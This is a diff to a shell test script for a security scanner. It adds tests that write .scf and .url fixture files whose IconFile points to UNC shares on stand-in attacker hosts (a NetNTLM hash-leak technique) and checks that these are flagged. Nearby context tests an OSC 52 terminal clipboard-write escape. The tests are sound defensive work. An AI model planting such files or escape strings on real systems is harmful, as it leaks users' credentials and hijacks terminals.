@@ -479,6 +479,26 @@ rm -rf "$LNK_DIR"
     && check "free-host: brand@trycloudflare.com → ALERT+" "0" "0" \
     || check "free-host: brand@trycloudflare.com → ALERT+" "0" "1"
 
+# F10: .scf IconFile=\\UNC → NetNTLM leak flagged
+UNC_DIR=$(mktemp -d)
+printf '[Shell]\nCommand=2\nIconFile=\\\\198.51.100.7\\share\\icon.ico\n' > "$UNC_DIR/leak.scf"
+./hlse_core file "$UNC_DIR/leak.scf" 2>&1 | grep -q "F10" \
+    && check "F10: .scf IconFile UNC flagged" "0" "0" \
+    || check "F10: .scf IconFile UNC flagged" "0" "1"
+
+# F10 FP guard: desktop.ini with LOCAL IconResource → no F10
+printf '[.ShellClassInfo]\nIconResource=C:\\Windows\\System32\\shell32.dll,21\n' > "$UNC_DIR/desktop.ini"
+./hlse_core file "$UNC_DIR/desktop.ini" 2>&1 | grep -q "F10" \
+    && check "F10 FP guard: local IconResource has no F10" "0" "1" \
+    || check "F10 FP guard: local IconResource has no F10" "0" "0"
+
+# F8/F10: .url carrying IconFile=\\UNC
+printf '[InternetShortcut]\nURL=https://x.evil.example\nIconFile=\\\\evil.example\\share\\i.ico\n' > "$UNC_DIR/pay.url"
+./hlse_core file "$UNC_DIR/pay.url" 2>&1 | grep -q "F10" \
+    && check "F10: .url IconFile UNC flagged" "0" "0" \
+    || check "F10: .url IconFile UNC flagged" "0" "1"
+rm -rf "$UNC_DIR"
+
 # Terminal escape injection: OSC 52 clipboard write → flagged
 ./hlse_core text "$(printf 'log line\x1b]52;c;aGk=\x07')" 2>&1 | grep -q "OSC 52" \
     && check "escape: OSC 52 clipboard-write flagged" "0" "0" \
